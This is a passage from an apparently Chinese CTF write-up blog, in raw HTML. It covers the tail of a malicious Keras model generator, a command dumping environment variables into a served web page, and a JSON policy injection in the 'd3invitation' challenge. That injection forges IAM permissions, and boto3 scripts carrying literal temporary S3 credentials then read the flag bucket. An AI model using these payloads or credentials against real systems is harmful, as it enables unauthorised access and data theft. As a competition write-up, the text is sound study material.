zip_read.infolist():</span><br><span class="line">            if item.filename != &quot;config.json&quot;:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(f&quot;tmp.&#123;model_name&#125;&quot;,model_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(model_name,&quot;a&quot;) as zf:</span><br><span class="line">        zf.writestr(&quot;config.json&quot;,json.dumps(config))</span><br><span class="line"></span><br><span class="line">print(&quot;[+] Malicious model ready&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>添加好依赖，直接运行，会在当前目录生成一个 model.keras 文件：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531164057-dpxsjty.png">
-
-<p>对了，命令记得改一下。</p>
-<p>接下来会遇到一个问题，那就是本地能打通，远程没反应。考虑无回显和不出网的情况，执行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;args&quot;:[[&quot;sh&quot;, &quot;-c&quot;, &quot;env&gt;&gt;/app/index.html&quot;]]</span><br></pre></td></tr></table></figure>
-
-<p>将环境变量追加进 &#x2F;app&#x2F;index.html 文件中。至于这个路径是怎么来的，查看 dockerfile 就知道了：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531181122-1h4bb4o.png">
-
-<p>拿到 flag ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531181209-unead7s.png">
-
-<h2 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h2><p>这道题给了两个环境，一个是 web 服务端，一个是云存储桶：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531181429-km5ikm9.png">
-
-<p>web 端可以上传名称和头像生成一个邀请函：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531181608-gljcvfy.png">
-
-<p>在这里抓包就能发现响应包中返回了 key 和 secret 等信息：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531202134-zqrs2e1.png">
-
-<p>我们可以看到这是一个获取凭证的接口。并且下一个请求就使用了这个凭证：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531202108-5qy6yxe.png">
-
-<p>尝试用这个信息来连接云存储桶，能连，但提示权限拒绝：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531184109-ymm6pyx.png">
-
-<p>应该是临时凭证。</p>
-<p>于是我们尝试在获取凭证的地方进行 json 注入，构造一个这样的请求体：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;object_name&quot;:&quot;*\&quot;]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:ListAllMyBuckets\&quot;],\&quot;Resource\&quot;:[\&quot;*\&quot;]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:GetObject\&quot;,\&quot;s3:PutObject\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::flag/*\&quot;]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:ListBucket\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::flag&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>拿到凭证：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601120124-mkk76lf.png">
-
-<p>在这个凭证中，我们为自己赋予了三种权限：</p>
-<ul>
-<li><code>s3:ListAllMyBuckets</code>​ 对所有桶（<code>&quot;*&quot;</code>​）的列表权限</li>
-<li><code>s3:GetObject</code>​&#x2F;<code>s3:PutObject</code>​ 对 <code>arn:aws:s3:::flag/*</code>​ 的读写权限</li>
-<li><code>s3:ListBucket</code>​ 对 <code>arn:aws:s3:::flag</code>​ 的列举权限</li>
-</ul>
-<p>更换凭证，重新测试：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import boto3</span><br><span class="line">from botocore.client import Config</span><br><span class="line"></span><br><span class="line">s3 = boto3.client(</span><br><span class="line">    &#x27;s3&#x27;,</span><br><span class="line">    endpoint_url=&#x27;http://35.241.98.126:31644&#x27;,</span><br><span class="line">    aws_access_key_id=&#x27;YTTMZPWHSR05QD9W1LU4&#x27;,</span><br><span class="line">    aws_secret_access_key=&#x27;jbdAgNFdjSMKTYCrm2k6BSuqN32T3g2s1MDRDM9i&#x27;,</span><br><span class="line">    aws_session_token=&#x27;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJZVFRNWlBXSFNSMDVRRDlXMUxVNCIsImV4cCI6MTc0ODc1NDA3NiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2t4cGMzUkJiR3hOZVVKMVkydGxkSE1pWFN3aVVtVnpiM1Z5WTJVaU9sc2lLaW9pWFgwc2V5SkZabVpsWTNRaU9pSkJiR3h2ZHlJc0lrRmpkR2x2YmlJNld5SnpNenBRZFhSUFltcGxZM1FpTENKek16cEhaWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjdktpSmRmU3g3SWtWbVptVmpkQ0k2SWtGc2JHOTNJaXdpUVdOMGFXOXVJanBiSW5Nek9reHBjM1JDZFdOclpYUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjaVhYMWRmUT09In0.59IwPi6Q1r0U1sqJzq-6Mg-TL4LUxslfJrXUyqZPX_BJQf0iQfoEoL_7XDmKrwg1fDCnEq9u2kzxZBlObFx3Sg&#x27;,</span><br><span class="line">    config=Config(signature_version=&#x27;s3v4&#x27;),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 列出所有存储桶</span><br><span class="line">response = s3.list_buckets()</span><br><span class="line">for bucket in response.get(&#x27;Buckets&#x27;, []):</span><br><span class="line">    print(bucket[&#x27;Name&#x27;])</span><br></pre></td></tr></table></figure>
-
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601120248-52i88bg.png">
-
-<p>这一次我们能够列出所有桶信息，发现 flag 桶。</p>
-<p>下一步列出 flag 桶中的所有 key ：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import boto3</span><br><span class="line">from botocore.client import Config</span><br><span class="line"></span><br><span class="line">s3 = boto3.client(</span><br><span class="line">    &#x27;s3&#x27;,</span><br><span class="line">    endpoint_url=&#x27;http://35.241.98.126:31644&#x27;,</span><br><span class="line">    aws_access_key_id=&#x27;YTTMZPWHSR05QD9W1LU4&#x27;,</span><br><span class="line">    aws_secret_access_key=&#x27;jbdAgNFdjSMKTYCrm2k6BSuqN32T3g2s1MDRDM9i&#x27;,</span><br><span class="line">    aws_session_token=&#x27;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJZVFRNWlBXSFNSMDVRRDlXMUxVNCIsImV4cCI6MTc0ODc1NDA3NiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2t4cGMzUkJiR3hOZVVKMVkydGxkSE1pWFN3aVVtVnpiM1Z5WTJVaU9sc2lLaW9pWFgwc2V5SkZabVpsWTNRaU9pSkJiR3h2ZHlJc0lrRmpkR2x2YmlJNld5SnpNenBRZFhSUFltcGxZM1FpTENKek16cEhaWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjdktpSmRmU3g3SWtWbVptVmpkQ0k2SWtGc2JHOTNJaXdpUVdOMGFXOXVJanBiSW5Nek9reHBjM1JDZFdOclpYUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjaVhYMWRmUT09In0.59IwPi6Q1r0U1sqJzq-6Mg-TL4LUxslfJrXUyqZPX_BJQf0iQfoEoL_7XDmKrwg1fDCnEq9u2kzxZBlObFx3Sg&#x27;,</span><br><span class="line">    config=Config(signature_version=&#x27;s3v4&#x27;),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">bucket_name = &quot;flag&quot;</span><br><span class="line"># 列出桶内容</span><br><span class="line">response = s3.list_objects_v2(Bucket=bucket_name)</span><br><span class="line"># 遍历并打印每个对象的 Key（即“路径/文件名”）</span><br><span class="line">if &#x27;Contents&#x27; in response:</span><br><span class="line">    for obj in response[&#x27;Contents&#x27;]:</span><br><span class="line">        print(obj[&#x27;Key&#x27;])</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;Bucket &#x27;&#123;bucket_name&#125;&#x27; 中没有对象。&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>发现一个 key 为 flag ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601120616-aa4mkb3.png">
-
-<p>最后列出 flag 桶的 flag key 的内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import boto3</span><br><span class="line">from botocore.client import Config</span><br><span class="line"></span><br><span class="line">s3 = boto3.client(</span><br><span class="line">    &#x27;s3&#x27;,</span><br><span class="line">    endpoint_url=&#x27;http://35.241.98.126:31644&#x27;,</span><br><span class="line">    aws_access_key_id=&#x27;YTTMZPWHSR05QD9W1LU4&#x27;,</span><br><span class="line">    aws_secret_access_key=&#x27;jbdAgNFdjSMKTYCrm2k6BSuqN32T3g2s1MDRDM9i&#x27;,</span><br><span class="line">    aws_session_token=&#x27;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJZVFRNWlBXSFNSMDVRRDlXMUxVNCIsImV4cCI6MTc0ODc1NDA3NiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2t4cGMzUkJiR3hOZVVKMVkydGxkSE1pWFN3aVVtVnpiM1Z5WTJVaU9sc2lLaW9pWFgwc2V5SkZabVpsWTNRaU9pSkJiR3h2ZHlJc0lrRmpkR2x2YmlJNld5SnpNenBRZFhSUFltcGxZM1FpTENKek16cEhaWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjdktpSmRmU3g3SWtWbVptVmpkQ0k2SWtGc2JHOTNJaXdpUVdOMGFXOXVJanBiSW5Nek9reHBjM1JDZFdOclpYUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjaVhYMWRmUT09In0.59IwPi6Q1r0U1sqJzq-6Mg-TL4LUxslfJrXUyqZPX_BJQf0iQfoEoL_7XDmKrwg1fDCnEq9u2kzxZBlObFx3Sg&#x27;,</span><br><span class="line">    config=Config(signature_version=&#x27;s3v4&#x27;),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 2. 指定桶名和对象键名</span><br><span class="line">bucket_name = &#x27;flag&#x27;</span><br><span class="line">object_key  = &#x27;flag&#x27;</span><br><span class="line"></span><br><span class="line"># 3. 调用 get_object 获取对象</span><br><span class="line">response = s3.get_object(Bucket=bucket_name, Key=object_key)</span><br><span class="line"></span><br><span class="line"># 4. 读取 Body —— 这是一个 StreamingBody，对大文件会分块读取。</span><br><span class="line">#    如果内容是文本（如纯 ASCII/UTF-8），可以 decode 成字符串；若是二进制则根据需要处理。</span><br><span class="line">body_stream = response[&#x27;Body&#x27;]</span><br><span class="line">content_bytes = body_stream.read()            # 读出所有字节</span><br><span class="line">try:</span><br><span class="line">    content_str = content_bytes.decode(&#x27;utf-8&#x27;)   # 尝试按 UTF-8 解码（若确实是文本）</span><br><span class="line">except UnicodeDecodeError:</span><br><span class="line">    # 如果不是文本，content_bytes 就是原始二进制，你可以按需保存或处理</span><br><span class="line">    content_str = None</span><br><span class="line"></span><br><span class="line"># 5. 打印结果</span><br><span class="line">if content_str is not None:</span><br><span class="line">    print(&quot;flag 的内容：&quot;)</span><br><span class="line">    print(content_str)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;读取到二进制数据，共 &#123;&#125; 字节，需要按二进制方式处理：&quot;.format(len(content_bytes)))</span><br><span class="line">    # 例如：写到本地文件</span><br><span class="line">    with open(&#x27;flag_download.bin&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(content_bytes)</span><br><span class="line">    print(&quot;已保存到 flag_download.bin&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>拿到 flag ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601120808-s5c63c2.png">
-
-<h3 id="获取凭证处-json-注入"><a href="#获取凭证处-json-注入" class="headerlink" title="获取凭证处 json 注入"></a>获取凭证处 json 注入</h3><p>下面简单解释一下为什么我们构造一个那样的 json 数据能够为凭证赋予更高的权限。</p>
-<p>这是一次典型的“JSON Policy Injection”利用——利用 <code>object_name</code>​ 参数的不当拼接，向最终的 IAM Policy 里插入了额外的语句，从而拿到了更高权限的临时凭证。下面分几步来说明：</p>
-<ol>
-<li>服务端如何生成 STS Policy（简化示例）</li>
-</ol>
-<p>我们用一个伪代码展示后端在收到请求后，如何把传进来的 <code>object_name</code>​ 拼到一个基础的 Policy 里，大体流程可能像这样：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1) 先从请求里取出 object_name</span></span><br><span class="line"><span class="keyword">let</span> objectName = request.<span class="property">body</span>.<span class="property">object_name</span>; <span class="comment">// 对应用户提交的 JSON 里的 &quot;object_name&quot; 值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) 构造一个最初级的 IAM Statement，用于限制只对某个单一对象的读写</span></span><br><span class="line"><span class="keyword">let</span> statement = &#123;</span><br><span class="line">  <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Action&quot;</span>: [<span class="string">&quot;s3:GetObject&quot;</span>, <span class="string">&quot;s3:PutObject&quot;</span>],</span><br><span class="line">  <span class="string">&quot;Resource&quot;</span>: [<span class="string">&quot;arn:aws:s3:::your-bucket/&quot;</span> + objectName]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) 再把这个 statement 放到一个 policy JSON 里去</span></span><br><span class="line"><span class="keyword">let</span> policyDocument = &#123;</span><br><span class="line">  <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">      statement</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 用这个 policy 去向 AWS STS 请求临时凭证</span></span><br><span class="line"><span class="keyword">let</span> creds = <span class="variable constant_">STS</span>.<span class="title function_">assumeRole</span>(&#123;</span><br><span class="line">    <span class="title class_">RoleArn</span>: <span class="string">&quot;...&quot;</span>,</span><br><span class="line">    <span class="title class_">Policy</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(policyDocument),</span><br><span class="line">    <span class="title class_">DurationSeconds</span>: <span class="number">3600</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>这段伪代码的关键在于：我们假定服务端没有对 <code>objectName</code>​ 做严格的结构校验或转义，而是直接拼接到最初的 Policy JSON 里。</p>
-<ol start="2">
-<li>请求拼接</li>
-</ol>
-<p>正常状态下，客户端提交：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;object_name&quot;:&quot;aaa.jpg&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>那么实际构造出来的 policyDocument（经过 JSON.stringify 后）就类似于：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;: [&quot;s3:GetObject&quot;, &quot;s3:PutObject&quot;],</span><br><span class="line">      &quot;Resource&quot;: [&quot;arn:aws:s3:::your-bucket/aaa.jpg&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>而当我们把请求体改为：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;object_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;*\&quot;]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:ListAllMyBuckets\&quot;],\&quot;Resource\&quot;:[\&quot;*\&quot;]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:GetObject\&quot;,\&quot;s3:PutObject\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::flag/*\&quot;]&#125;,&#123;\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:ListBucket\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>拼完后，整个 policyDocument 看起来就成了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;:&quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;:[</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;:&quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;:[&quot;s3:GetObject&quot;,&quot;s3:PutObject&quot;],</span><br><span class="line">      &quot;Resource&quot;:[&quot;arn:aws:s3:::your-bucket/*&quot;]</span><br><span class="line">    &#125;,                                 // 闭合前面的</span><br><span class="line"></span><br><span class="line">    // ----- 以下全是我们注入的三条 Statement：</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;:&quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;:[&quot;s3:ListAllMyBuckets&quot;],</span><br><span class="line">      &quot;Resource&quot;:[&quot;*&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;:&quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;:[&quot;s3:GetObject&quot;,&quot;s3:PutObject&quot;],</span><br><span class="line">      &quot;Resource&quot;:[&quot;arn:aws:s3:::flag/*&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;:&quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;:[&quot;s3:ListBucket&quot;],</span><br><span class="line">      &quot;Resource&quot;:[&quot;arn:aws:s3:::flag&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">    // 这里只有一个 &#125;，是拼回外层的 &quot;]&#125;&quot; 那个</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过这种方式，我们可以为自己赋予任何想要的权限。</p>
-<h2 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h2><p>题目提示：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250601122249-90alrko.png">
-
